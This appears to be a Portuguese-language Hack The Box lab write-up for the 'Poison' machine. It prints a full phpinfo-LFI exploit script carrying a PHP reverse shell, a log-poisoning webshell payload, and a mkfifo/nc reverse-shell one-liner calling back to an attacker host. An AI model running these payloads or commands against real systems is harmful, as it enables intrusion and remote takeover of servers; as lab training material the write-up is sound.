---
title: "Hack The Box - Poison"
tags: [FreeBSD,Medium,Port Forwading,FIFO Port Forwading,BurpSuite,Phpinfolfi,PayloadAllTheThings]
categories: HackTheBox OSCP
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-poison/P_inicial.png)

Link: <https://www.hackthebox.eu/home/machines/profile/132>

# Enumeração

## Primeiro passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-poison/P_nmap.png)

### Explicação de cada parâmetro do Nmap

> -sC --> Rodar alguns scripts padrão em cada porta (Não vou rodar essa flag pq teve uma saída bem bizarra)

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

### Verificamos que temos 3 portas abertas no servidor

> Porta 22 - Servidor SSH

> Portas 80 e 8080 - Servidor Web

## Enumeração da Porta 80

Por se tratar de um servidor web, a primeira coisa que fazemos é acessar ele pelo navegador

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-poison/P_web.png)

Aqui nessa máquina vamos fazer de dois modos diferentes, um através do phpinfolfi e outra através do poisoning do log do apache, é interessante pra treinarmos as duas possibilidades

# Explorando PHPINFOLFI

Esse creio que seja o mais simples, uma vez que o arquivo que precisamos ver para que funcione é o `phpinfo` e ele está disponível logo de cara

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-poison/P_php1.png)

Precisamos verificar se o campo `file_uploads` está marcado como `On`, se estiver, podemos executar o `phpinfolfi`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-poison/P_php.png)

Então pesquisamos sobre esse phpinfolfi

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-poison/P_php2.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-poison/P_php3.png)

Baixamos ele para nossa máquina

> https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/File%20Inclusion/phpinfolfi.py

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-poison/P_php4.png)

## 1º Tentativa - Configurando e Executando (Fail)

Agora vamos verificar como ele funciona, e oq precisamos mudar nele para que funcione nesse servidor. Ao executarmos, ele já nós deu o caminho, não podemos esquecer de modificar o caminho do phpinfo.php

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-poison/P_php5.png)

Então modificamos no script isso, mas como vamos saber esse caminho? É aquele que aparece no Browser, vamos jogar no BurpSuite a requisição pra ficar melhor de ver

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-poison/P_php6.png)

Aqui está `GET /browse.php?file=phpinfo.php`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-poison/P_php7.png)

Então modificamos no script

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-poison/P_php8.png)

Outra coisa que mudaremos é o payload que será executado, eu não quero um LFI, até pq lfi eu já tenho no servidor, eu quero um shell, então vou colocar um webshell php ali dentro no lugar do payload...

Vou utilizar um que já vem no Kali mesmo, para facilitar o trabalho

`/opt/shell/php-reverse-shell.php`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-poison/P_php9.png)

Copiamos todo o conteúdo e colocamos dentro do `PAYLOAD` (Lembrar de mudar IP e Porta, obviamente)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-poison/P_php10.png)

O arquivo ficou assim no final...

phpinfolfi.py
```
#!/usr/bin/python
# https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf
from __future__ import print_function
from builtins import range
import sys
import threading
import socket

def setup(host, port):
    TAG="Security Test"
    PAYLOAD="""%s\r
<?php
set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.16.2';  // CHANGE THIS
$port = 443;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 

%s""" %(len(REQ1_DATA),host,REQ1_DATA)
    #modify this to suit the LFI script
    LFIREQ="""GET /browse.php?file=%s HTTP/1.1\r
User-Agent: Mozilla/4.0\r
Proxy-Connection: Keep-Alive\r
Host: %s\r
\r
\r
"""
    return (REQ1, TAG, LFIREQ)

def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((host, port))
    s2.connect((host, port))

    s.send(phpinforeq)
    d = ""
    while len(d) < offset:
        d += s.recv(offset)
    try:
        i = d.index("[tmp_name] =>")
        fn = d[i+17:i+31]
    except ValueError:
        return None

    s2.send(lfireq % (fn, host))
    d = s2.recv(4096)
    s.close()
    s2.close()

    if d.find(tag) != -1:
        return fn

counter=0
class ThreadWorker(threading.Thread):
    def __init__(self, e, l, m, *args):
        threading.Thread.__init__(self)
        self.event = e
        self.lock =  l
        self.maxattempts = m
        self.args = args

    def run(self):
        global counter
        while not self.event.is_set():
            with self.lock:
                if counter >= self.maxattempts:
                    return
                counter+=1

            try:
                x = phpInfoLFI(*self.args)
                if self.event.is_set():
                    break
                if x:
                    print("\nGot it! Shell created in /tmp/g")
                    self.event.set()

            except socket.error:
                return


def getOffset(host, port, phpinforeq):
    """Gets offset of tmp_name in the php output"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    s.send(phpinforeq)

    d = ""
    while True:
        i = s.recv(4096)
        d+=i
        if i == "":
            break
        # detect the final chunk
        if i.endswith("0\r\n\r\n"):
            break
    s.close()
    i = d.find("[tmp_name] =>")
    if i == -1:
        raise ValueError("No php tmp_name in phpinfo output")

    print("found %s at %i" % (d[i:i+10],i))
    # padded up a bit
    return i+256

def main():

    print("LFI With PHPInfo()")
    print("-=" * 30)

    if len(sys.argv) < 2:
        print("Usage: %s host [port] [threads]" % sys.argv[0])
        sys.exit(1)

    try:
        host = socket.gethostbyname(sys.argv[1])
    except socket.error as e:
        print("Error with hostname %s: %s" % (sys.argv[1], e))
        sys.exit(1)

    port=80
    try:
        port = int(sys.argv[2])
    except IndexError:
        pass
    except ValueError as e:
        print("Error with port %d: %s" % (sys.argv[2], e))
        sys.exit(1)

    poolsz=10
    try:
        poolsz = int(sys.argv[3])
    except IndexError:
        pass
    except ValueError as e:
        print("Error with poolsz %d: %s" % (sys.argv[3], e))
        sys.exit(1)

    print("Getting initial offset...", end=' ')
    reqphp, tag, reqlfi = setup(host, port)
    offset = getOffset(host, port, reqphp)
    sys.stdout.flush()

    maxattempts = 1000
    e = threading.Event()
    l = threading.Lock()

    print("Spawning worker pool (%d)..." % poolsz)
    sys.stdout.flush()

    tp = []
    for i in range(0,poolsz):
        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))

    for t in tp:
        t.start()
    try:
        while not e.wait(1):
            if e.is_set():
                break
            with l:
                sys.stdout.write( "\r% 4d / % 4d" % (counter, maxattempts))
                sys.stdout.flush()
                if counter >= maxattempts:
                    break
        print()
        if e.is_set():
            print("Woot!  \m/")
        else:
            print(":(")
    except KeyboardInterrupt:
        print("\nTelling threads to shutdown...")
        e.set()

    print("Shuttin' down...")
    for t in tp:
        t.join()

if __name__=="__main__":
    print("Don't forget to modify the LFI URL")
    main()
```

Bom, agora executamos ele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-poison/P_php11.png)

Erro! Muito comum as pessoas desistirem aqui de explorar por esse modo, mas vamos ver a fundo o que está acontecendo e debugar isso

## 2º Tentativa - Corrigindo e Executando (Sucesso)

Primeiro vamos ler a mensagem de erro que o Python mostrou

`ValueError: No php tmp_name in phpinfo output`

Hum... Ta falando que não ta encontrando a variável tmp_name dento do output do phpinfo. Que tal jogarmos a requisição pro burp pra ver oq podemos fazer, possivelmente deve ta com algum erro de parâmetro...

Então vamos lá

### Setando o Burp como Local Proxy

Primeira coisa a se fazer é setar o BurpSuite como um proxy local, a requisição vai ser enviada para o burp e o burp vai enviar para a máquina, sendo assim eu consigo debugar exatamente o que está sendo enviado

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-poison/P_burp.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-poison/P_burp1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-poison/P_burp2.png)

Agora enviamos a requisição para o Localhost na porta 80

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-poison/P_burp3.png)

Ai está a requisição que é enviado para o servidor

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-poison/P_burp4.png)

Bom, vamos ver o que temos na Response, lá no erro que dava ele falava que não achava a variável `tmp_name` no output, ou seja na response, e olha, encontramos ela

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-poison/P_burp5.png)

Hummm... estranho, muito estranho, não é? Vamos ver como está esse `tmp_name` no exploit

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-poison/P_burp6.png)

Ele aparece na linha 198 e 256, as outras duas são apenas para informação, então vamos ver

Linha 198

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-poison/P_burp7.png)

Linha 256

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-poison/P_burp8.png)

Mas olha que estranho, no exploit ele está assim: `[tmp_name] =>` e no burp está assim `[tmp_name] =&gt`. É óbvio que nunca vai achar, ele ta dando "find" na string errada, então vamos corrigir no exploit

Linha 198 - Corrigida

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-poison/P_burp9.png)

Linha 256 - Corrigida

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-poison/P_burp10.png)

### Executando e ganhando shell

Agora executamos e ganhamos shell na máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-poison/P_burp11.png)

# Explorando Poison Log Apache

Outro modo de se explorar essa máquina é a partir do envenamento de log do apache (Log Poisoning), injetamos um código php lá dentro e a partir da LFI conseguimos o acesso a máquina

Primeiro passo é descobrir onde fica esse arquivo de log do apache no FreeBSD

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-poison/P_log.png)

FreeBSD Apache access log file location – /var/log/httpd-access.log

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-poison/P_log1.png)

Pronto, agora sabendo onde fica o log de erros do apache vamos verificar como podemos explorar isso

A ideia é conseguir colocarmos algum php malicioso dentro desse log, uma vez que ele vai executar php Isso pode ser feito através do burpsuite, eu mandando um php  no lugar do user agent, por exemplo, uma vez que ele fica salvo no log. Com o curl fica mais fácil de verificarmos isso

`curl http://10.10.10.84/browse.php?file=/var/log/httpd-access.log`

Essa é a carinha dele... E temos até essa requisição Curl que eu fiz agora!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-poison/P_log2.png)

Outro modo de descobrimos onde está o arquivo de log é através do arquivo `/usr/local/etc/apache24/httpd.conf`, pois é ali que o servidor procura o arquivo onde vai guardar os logs, por algum motivo pode ser que o administrador tenha mudado o local, não seja o padrão, então ele vai ser armazenado nesse local (no caso do FreeBSD, mas linux também tem seus padrões para esse arquivo de configuração). Dando um curl nele, temos

`curl http://10.10.10.84/browse.php?file=/usr/local/etc/apache24/httpd.conf`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-poison/P_log3.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-poison/P_log4.png)

## Envenenando o log

Bom, agora vamos realmente explorar isso

Vamos mandar uma requisição para o Burp, pq lá conseguimos alterar melhor e enviar ao servidor

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-poison/P_bp.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-poison/P_bp1.png)

Mandamos para o Repeater

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-poison/P_bp2.png)

Agora alteramos o User-Agent para um php cmd `<?php system($_REQUEST['cmd']) ?>` e enviamos ao servidor

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-poison/P_bp3.png)

Agora verificamos no curl, que ele está executado o código php

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-poison/P_bp4.png)

## Ganhando RCE

Agora testamos, pra ver se realmente temos RCE na máquina, vamos executar um `id`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-poison/P_bp5.png)

Show, temos RCE!

## Pegando Reverse Shell

Agora devemos pegar um reverse shell, para isso vou jogar tudo para o burp, pq lá melhor de trabalhar

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-poison/P_bp6.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-poison/P_bp7.png)

Jogamos para o Repeater

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-poison/P_bp8.png)

Agora pegamos um reverse shell

`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.3 443 >/tmp/f`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-poison/P_bp9.png)

Bom, agora vamos prosseguir

# Escalando Privileǵio (www-data -> charix)

Bom, não precisarimos de tudo isso para conseguir escalar privilégio, mas é bom pra treinarmos. Poderíamos ter tido acesso ao arquivo de senha através do LFI do servidor...

Verificamos o `listfiles.php`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-poison/P_p.png)

Dentro dele tem uma referência para o `pwdbackup.txt`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-poison/P_p1.png)

Então verificamos do que se trata esse pwdbackup, pq pelo nome chama atenção

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-poison/P_p2.png)

Ai está... Ou poderíamos ter acessado ele pelo shell que conseguimos, da na mesma

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-poison/P_3.png)

Beleza agora vamos analisar essa string maluca

```
This password is secure, it's encoded atleast 13 times.. what could go wrong really.. 
Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS bVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW M040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs WmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy eG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G WkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw MXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa T1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k WFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk WGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0 NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT Vm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO Ukd4RVdub3dPVU5uUFQwSwo= 
```

Ta na cara que é um base64 bizarro, ali fala que foi encodado pelo menos 13 vezes, então vamos desencodar até ele virar algo legível e útil

## Decodificando senha

Agora vamos lá, demonstrar vários meios que poderíamos ter utilizado para conseguir descobrir oq essa string quer dizer

### CyberChef

A primeira delas é o `CyberChef`

https://gchq.github.io/CyberChef/

Jogamos a string dentro do `Input` e colocamos 13 vezes o `From Base64` dentro do `Recipe`, e o resultado é esse:

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-poison/P_p3.png)

### Bash

Poderíamos fazer isso através do bash também, concatenando vários `base64 -d` nas saídas

`for i in $(seq 0 12); do echo -n '| base64 -d'; done`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-poison/P_p4.png)

Charix!2#4%6&8(0

## Login como charix

Verificamos que o usuário Charix tem um shell na máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-poison/P_p5.png)

Agora realizamos o login ssh como charix (sabendo que a Porta 22 está aberta)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-poison/P_p6.png)

# Escalação de Privilégio (charix -> root)

Bom, agora vamos iniciar a escalação de privilégio do usuário Charix para o usuário Root da máquina

Olha na pasta home do usuário temos uma "dica", um arquivo chamado `secret.zip` possivelment é algo interessante para nós verificarmos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-poison/P_p7.png)

Passamos ele para nossa Kali, pra analizarmos mais de perto, para isso utilizamos o `scp`

`scp charix@10.10.10.84:secret.zip .`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-poison/P_p8.png)

Bom, por se tratar de um arquivo zip, poderíamos utilizar o `john2zip` de depois tentar quebrar a senha desse arquivo com o john, mas vmaos tentar extrair com a senha do Charix `Charix!2#4%6&8(0`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-poison/P_p9.png)

Estranho, um binário, mas que a princípio não tem muita finalidade, então vamos voltar a enumerar a máquina, pra ver se encontramos onde utilizar esse arquivo

## Enumerando VNC

Bom, aqui o ponto é verificarmos quais processos estão sendo executados na máquina. Com o comando `netstat -an -p tcp`, um pouco diferente do linux, mas pq é FreeBSD

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-poison/P_p10.png)

Verificamos que está sendo executado algo na porta 5801 e 5901 localmente (não iria aparecer no nmap). Pesquisamos pelo que poderia ser essas duas portas e temos que são geralmente do VNC

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-poison/P_p11.png)

Realmente é VNC, estranho... vamos verificar pelos processos agora e encontramos um VNC sendo executado como root!

`ps -aux | grep vnc`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-poison/P_p12.png)

A "explicação" desses parâmetros é a seguinte

> :1 - display número 1

> -rfbauth /root/.vnc/passwd - especifica o arquivo que tem a senha para autenticar os usuários (Lembra do secret.zip? Então...)

> -rfbport 5901 - nos diz a porta para nos conectar

> localhost - somente localhost

## Port Forwading

Devemos então fazer um portforwading das duas portas 5901 e 5801 para podermos acessar elas localmente. Uma vez que temos uma conexão SSH fica fácil fazer isso.

Temos várias maneiras de se fazer isso, vou demostrar algumas

### SSH Proxy Socks

O SSH pode funcionar como um socks proxys, com a flag `-D`

`ssh charix@10.10.10.84 -D 9050 -f -N`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-poison/P_p13.png)

Devemos ter configurado o arquivo do `proxychains` também

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-poison/P_p14.png)

Agora acessamos o VNC Viewer

`proxychains vncviewer 127.0.0.1:5901 -passwd secret`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-poison/P_p15.png)

### Arquivo FIFO

Outro modo de se fazer isso (port forwading) é através de um arquivo fifo, e redirecionando o tráfego para a porta 5904, por exemplo, que é a seção do VNC que está sendo executada locamente na máquina

`mkfifo fifo`

`cat /tmp/fifo | nc localhost 5901 | nc -l 5904 > /tmp/fifo`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-poison/P_p16.png)

Agora na nossa máquina, nos conectamos ao servior na porta 5904

`vncviewer -passwd secret 10.10.10.84:4`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-poison/P_p17.png)

Essa eu aprendi hoje, nunca tinha visto essa técnica, muuuuito útil (verificado no blog do `Ech0`)

### SSH Konami (-D)

Outro modo, que também da certo, é utilizar do `SSH Konami`, ele é igual ao outro que fizemos antes, mas fica mais prático (ou não), bem, é mais um modo de e fazer isso

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-poison/P_k.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-poison/P_k1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-poison/P_k2.png)

Então fazemos o Port Forwading, para isso o primeiro comando da janela tem que ser um `~` seguido de `SHIFT + C`, ai é aberto o prompt do Konami

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-poison/P_k3.png)

Agora digitamos `-D 9050`, essa é a porta que eu tenho configurada no meu proxychains

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-poison/P_k4.png)

Agora, novamente, com o proxychains eu acesso o servidor

`proxychains vncviewer 127.0.0.1:5901 -passwd secret`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-poison/P_k5.png)

### SSH Konami (-L)

Isso também poderia ter sido feito somente a porta, não um proxysocks, ai no caso seria `-L 5901:127.0.0.1:5901`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-poison/P_k6.png)

Agora nos conectamos

`vncviewer 127.0.0.1:5901 -passwd secret`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-poison/P_k8.png)

## Pegamos as flags de user e root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-poison/P_root.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-poison/P_user.png)

# Algo a mais

Outra coisa importante que podemos mostrar aqui é o fato de conseguirmos "quebrar" esse arquivo de senha do VNC, tem vários na internet ai, vamos utilizar esse para exemplo

`https://github.com/trinitronx/vncpasswd.py`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-poison/P_pass.png)

Baixamos para máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-poison/P_pass1.png)

Rodamos no `secret`

`./vncpasswd.py -d -f /root/hackthebox/poison/secret`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-poison/P_pass2.png)

Bom, com essa senha não seria necessário utilizar o `-passwd`, quando abrisse o prompt de senha, digitariamos a senha e pronto. Creio que já exploramos bastante dessa máquina, muitas técnicas e coisas interessantes!

Logicamente a máquina não se esgota aqui, o que esgotou foi meu saco pra fazer mais coisas nela... mas foi uma máquina legal! Valeu, até a próxima